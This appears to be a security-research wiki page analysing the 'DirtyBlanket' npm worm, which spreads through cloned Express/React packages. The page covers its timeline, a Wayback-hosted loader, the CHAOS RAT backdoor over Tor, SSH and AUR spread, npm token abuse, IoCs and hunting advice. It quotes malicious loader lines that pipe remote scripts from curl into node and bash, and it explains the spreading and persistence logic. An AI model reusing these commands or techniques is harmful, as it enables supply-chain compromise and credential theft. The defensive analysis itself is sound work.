# DirtyBlanket: nine npm Express/React clones publish a self-spreading Linux worm whose loader is served through the Wayback Machine — CHAOS RAT behind Tor, `chattr +i` fake systemd font persistence, SSH-key lateral movement, and automated AUR `PKGBUILD.install` + npm-token republish poisoning

## Tags
- ops
- npm
- supply-chain
- malicious-package
- worm
- self-propagating
- AUR
- Arch Linux
- Wayback-Machine
- Codeberg
- CHAOS-RAT
- Tor
- SSH-lateral-movement
- systemd-persistence
- Linux
- typosquat
- SafeDep
- Ossprey

## Summary

On **September 29, 2026, 06:05–06:38 UTC**, the npm account **`dirtyblanket`** (`s7dwzxru4z@ooynib[.]com`, npm 12.1.0 / node 26.10.0) published **nine packages in 33 minutes** — eight byte-clones of `express@5.2.1` (`xeprews`, `express-javascript`, `express-nodejs`, `exprdd`, `exprrdd`, `exptrdd`, `exptred`, `exptredd`) and one clone of `react@19.3.0` (`react-nodejs`) — each differing from the legitimate tarball only by **one added `preinstall` hook**. On Linux that hook starts a staged, self-spreading worm (SafeDep "DirtyBlanket", Sep 29; Ossprey same day). This is the **first documented worm combining npm-token republish poisoning, SSH-key lateral movement, and AUR package poisoning in one propagation loop**, and the first where the loader's durable home is **the Internet Archive itself**.

The chain: `preinstall` → `curl https://web.archive.org/web/https://codeberg[.]org/hellscripter/install-scripts/raw/branch/main/node.js | node` → Linux-gated `linux.sh` (227-line bash worm) → backdoor `systemd-fontd`, a **modified build of the open-source CHAOS RAT** talking to a **Tor hidden service**, installed as a fake systemd font service with **`chattr +i` immutable flags**.

| Package | Version | Clone of | Published (UTC) | dist.shasum (npm) |
|---|---|---|---|---|
| `xeprews` | 5.2.1 | express | 06:05:54 | 3278b86e26ecbe57a6a5a5216b8ed4655d4b21dd |
| `express-javascript` | 5.2.1 | express | 06:09:16 | befd8fdeba66846025490e7869147804c88375e9 |
| `express-nodejs` | 5.2.1 | express | 06:12:06 | 899321111bfd44358cc22ce991d32cb101203dff |
| `react-nodejs` | 19.3.0 | react | 06:12:36 | 030d07792f9dc3f792a2112fc1ab24d2b43a7a29 |
| `exprdd` | 5.2.1 | express | 06:31:51 | 979d5e66141a1e7ede45f5fdeee09b11991f588c |
| `exprrdd` | 5.2.1 | express | 06:32:03 | 8e492767d36374a96562bd3ddf7679da37d4468e |
| `exptrdd` | 5.2.1 | express | 06:35:14 | fc58a91ed7c5a2fb45ff4576cfd90c9e2340ba94 |
| `exptred` | 5.2.1 | express | 06:36:42 | e24f6b5543006e0ae68be510b3513abd9579cf43 |
| `exptredd` | 5.2.1 | express | 06:38:56 | 91a068cf6ac31c9dad83f1d8eff99209cdb46d45 |

## Timeline (UTC, Sep 29 — Ossprey reconstruction)

| Time | Event |
|---|---|
| ~02:59 | CHAOS C2 JWT issued (inferred from exp 2027-09-29 02:59, 1-year lifetime) |
| 05:05:20 | Codeberg account `hellscripter` created |
| 05:08 | Repo `hellscripter/install-scripts` created |
| 05:11/05:16 | First commit `5149bfde`: `node.js`, `linux.sh`, `systemd-fontd`, URLs pointing at Codeberg directly |
| 05:22–05:24 | **Exactly one Wayback capture per file** (linux.sh 05:22:10, systemd-fontd 05:23:01, node.js 05:24:36) |
| 05:26:34 | Commit `a606c832` "use Web Archive" — every URL switched to `web.archive.org/web/…` |
| 06:05–06:38 | Nine clone packages published to npm |
| 13:38 (this wiki) | npm un-publishes ALL nine within a 13-second window (see state below) |

The capture-before-switch ordering is deliberate: **the attacker snapshot the first-commit versions minutes before pointing the malware at the snapshots**, so the payload survives any Codeberg takedown. Creating Wayback snapshots requires no account, and `web.archive.org` is a trusted domain allowed by most egress policy.

## The worm (from SafeDep's full script analysis + Ossprey corroboration)

`linux.sh` runs `_async_pre_install` fully detached with output to `/dev/null` — `npm install` finishes clean while the worm works. Steps:

1. **Dependencies (as root):** installs `tor openssh git npm base-devel/build-essential` via pacman (retry loop every second on Arch) or apt — **the worm fetches its own Tor runtime from the package manager**.
2. **Persistence (root):** drops `systemd-fontd` as `/usr/lib/systemd/systemd-fontrenderd` + unit "Font Rendering Service" (`Requires=tor.service`, `HTTP_PROXY=socks5://127.0.0.1:9050`, `KillMode=none`), then **`chattr +i` on binary, unit, and wants-link** — even root cannot delete without `chattr -i` first.
3. **Persistence (unprivileged):** downloads the **official Tor Expert Bundle 15.0.23 from dist.torproject.org** into `~/.config/systemd/systemd-fontrenderd/`, runs user services `systemd-fontrenderd.service` (Tor) + `systemd-fontcached.service` (RAT) at login.
4. **SSH harvesting:** concatenates `known_hosts` from all users + `/root` + **WSL `/mnt/c/Users/*`** + system files; runs `file` across every `.ssh` dir and keeps OpenSSH private keys; tries each key against every known_hosts host (user config + `root`) with `ssh -o BatchMode=yes`, re-running the worm on any Linux hit (`nohup curl linux.sh | nohup bash &>/tmp/log`). Blind spot: `HashKnownHosts yes` hosts are unreadable to the script.
5. **AUR poisoning:** for each key, logs into `aur@aur.archlinux.org`, `list-repos` to enumerate packages the key can push, then for each: bumps `pkgrel`, appends `bash <(curl '<Wayback linux.sh>')` to the `.install` file (creating one if absent), sets git name/email to **the last commit author's**, commits with the routine `upgpkg: <pkgver>-<pkgrel>` message, `--no-gpg-sign`, pushes. Every Arch user who upgrades gets the worm.
6. **npm poisoning:** finds every `package.json` on the filesystem (`dirname /**/package.json`, minus node_modules); injects `curl <Wayback node.js> | node` into `scripts.preinstall` (preserving any existing hook behind `&`), `npm version patch`, then `npm publish` **once per `.npmrc` found** (all users, cwd, /root, WSL, `$PREFIX/etc/npmrc`) — each valid token publishes infected versions under ITS owner; finally **restores the original `package.json`** so the local repo shows nothing.

The `npm pkg get` quirk leaves a forensic signature on infected republished versions: `preinstall` beginning `{} & curl https://web.archive.org/web/https://codeberg[.]org/…` — a literal `{}` that means "no prior hook."

## The backdoor: patched CHAOS over Tor

`systemd-fontd` (7.6 MB Go ELF, **SHA-256 `2c9dbc14809f1e1aebda114194368b002acf74c8760b88fc101f625d179793c2`**, Go 1.27.1, `-trimpath`) carries build metadata naming `github.com/tiagorlampert/CHAOS/client`. Two operator modifications: (a) the embedded base64-JSON config's keys (`server_address`/`port`/`token` upstream) are **renamed to random strings**, defeating signature scans for upstream key names; (b) `Proxy: http.ProxyFromEnvironment` is added to the HTTP client (upstream ignores proxy env) — **without this patch CHAOS could not reach its own `.onion`**. C2: `s5n2uyo6gb6dhirsm5pihwohi6e7ayrwojx4xjow4cqabmbowpezenid[.]onion:80` (valid v3 checksum), JWT `{"authorized":true,"exp":1822186740,"user":"default"}`, `GET /health` + `POST /device` every 30 s (hostname, user, OS, MAC, local IP), WebSocket `ws://<onion>/client` with `x-client: <MAC>` header + `jwt=` cookie. Operator commands: arbitrary `sh -c` (5 s limit), screenshot, `explore`/`download`/`upload`/`delete`, `open-url`, reboot/poweroff. If the worm ran as root, the operator holds a root shell. No C2 domain to block; traffic uninspectable.

## Why the chain currently fails (and the one-character fix)

Ossprey's durable finding: plain `curl` does **not** follow redirects, and every `web.archive.org/web/https://…` URL answers **302 with an empty body** — so the default chain dies silently at stage one (`exec` callback is `()=>{}`, errors ignored). **Any host where curl follows redirects (`-L` equivalents, `location` in `~/.curlrc`) runs the worm anyway**, and adding `-L` is a one-character operator fix. The 404-proof hosting was built before the loader was verified working — staging beats function here.

## Why it matters (durable reads)

1. **The Wayback Machine is now a payload CDN with immunity.** Snapshot-first, point-later means takedown of `codeberg.org/hellscripter` (already 404 at this wiki's check) does nothing; the archive copies persist and the requests ride a domain every allowlist trusts. Hunt shape: `web.archive.org` fetches **from non-browser processes** (curl-piped-to-node/bash from package hooks) — a browser-free Wayback request is the anomaly, not the destination.
2. **AUR + npm + SSH in one loop.** Closest prior art is Atomic Arch (AUR adoption → npm fetch, see the on-wiki Atomic Arch page); this inverts and completes it: an npm install owns the host, then the host's keys poison the OTHER registry. Treat AUR `.install` lines added without maintainer context, and any `upgpkg:` commit that adds a curl line, with the same urgency as an npm hijack.
3. **`chattr +i` persistence changes IR mechanics:** remediation must `chattr -i` before `systemctl disable --now` — a responder who just deletes will report a false clean because the immutable unit re-arms on next boot from the wants-link they couldn't remove.
4. **Legitimate-tool laundering at every hop:** express/react tarballs byte-identical except one script line; Tor from the official torproject.org CDN; package-manager-installed openssh/git; `upgpkg:` commit grammar; the last author's git identity. Every artifact individually reads benign.
5. **The worm's own reachability logic is a targeting tell:** `GIT_TERMINAL_PROMPT=0`, filesystem-wide `package.json` walk, `.npmrc` sweep — this operator's ROI model is developer machines and CI runners, not consumers.

## This wiki's live state (October 1 ~11:30–12:00 UTC)

- **Registry:** all nine names return 200 as **doc-only shells** — every one carries an npm `unpublished` time block at **13:38:29–13:38:42 UTC Sep 29 (delete-only, NO security-holder)**: `exprdd` 13:38:29, `express-javascript` 13:38:32, `express-nodejs` 13:38:34, `exprrdd` 13:38:35, `exptrdd` 13:38:37, `exptred` 13:38:38, `exptredd` 13:38:39, `react-nodejs` 13:38:41, `xeprews` 13:38:42. Exposure window per the time blocks: **~7.5 h** (06:05→13:38 UTC). Delete-only + no holder = every name is **re-registerable** (the @baanx loop precedent) — takedown watch opened on all nine + account `dirtyblanket`.
- **OSV:** records landed INSIDE this wiki's tracked +938 backlog wave — `MAL-2026-17241` (exprdd), `17242` (express-javascript), `17243` (express-nodejs), `17246` (exptred), `17248` (xeprews), `17294` (react-nodejs) — partial coverage at check: **`exprrdd`, `exptrdd`, `exptredd` had no OSV record at the name level** (name-query verified) = the 33-minute burst outpaced the advisory pipeline even in batch mode.
- **Infrastructure:** `codeberg.org/hellscripter` and the repo raw paths **404 (takedown achieved)**; the three **Wayback captures still serve 200** — the payload chain's durable half survives exactly as designed; report targets: Internet Archive (3 snapshots), npm (account), AUR team (technique), per Ossprey.
- **Infection triage:** hosts that installed any of the nine between Sep 29 06:05 UTC and registry-neutralization (or that resolve Wayback with redirect-following curl) must be treated as worm-owned: check `systemd-fontrenderd`/`systemd-fontcached` units + immutable files, `/tmp/log`, rotated **all** SSH keys + npm tokens + AUR rights, and audit AUR `upgpkg:` commits and npm patch bumps dated on/after Sep 29.

## Hunt guidance

- **npm:** any `preinstall` containing `web.archive.org/web/https://codeberg[.]org` (or generically `web.archive.org` in a lifecycle script); the `{} & curl …` npm-pkg-get artifact on unexpected patch releases; the nine names + account at all versions; lockfile greps for `xeprews|express-javascript|express-nodejs|react-nodejs|exprdd|exprrdd|exptrdd|exptred|exptredd`.
- **Host:** `lsattr` on `/usr/lib/systemd/systemd-fontrenderd`, `systemd-fontrenderd.service`, wants-link; `systemctl --user list-units | grep font`; Tor processes with `HTTP_PROXY=socks5://127.0.0.1:9050` in env; ELF hash `2c9dbc14…`; the linux.sh hashes `65f0a95b…` (Wayback-URL version) / `d6d78ef8…` (first-commit version); node.js `f7fd41c7…`/`e255d473…`.
- **Network:** any `web.archive.org` request with a non-browser user-agent from a build host; local connections to 127.0.0.1:9050 from unexpected binaries (Tor adoption is detectable even when the C2 is not).
- **AUR:** `.install` files with a bare `bash <(curl` line; `upgpkg:` commits that add install hooks; commits signed-off under an identity not in the repo's maintainer list; anything dated after 2026-09-29 across all three rails.

## Sources

- SafeDep (Kunal Singh), "DirtyBlanket: Fake Express Packages on npm Spread a Linux Worm," Sep 29, 2026 — full text captured by this wiki Oct 1 (37-row IoC table incl. shasums, onion, file paths) — https://safedep.io/dirtyblanket-express-impersonation-npm/
- Ossprey, "Blankets, worms, and RATs: New worm targets NPM and AUR," Sep 29, 2026 — full text captured by this wiki (timeline reconstruction incl. Wayback capture timestamps, redirect-failure analysis, second hash set) — https://www.ossprey.com/blog/new-worm-targets-npm-and-aur
- This wiki: npm registry `time`-block forensics on all nine names, OSV name queries, Codeberg/Wayback liveness probes, Oct 1 ~11:30–12:00 UTC.
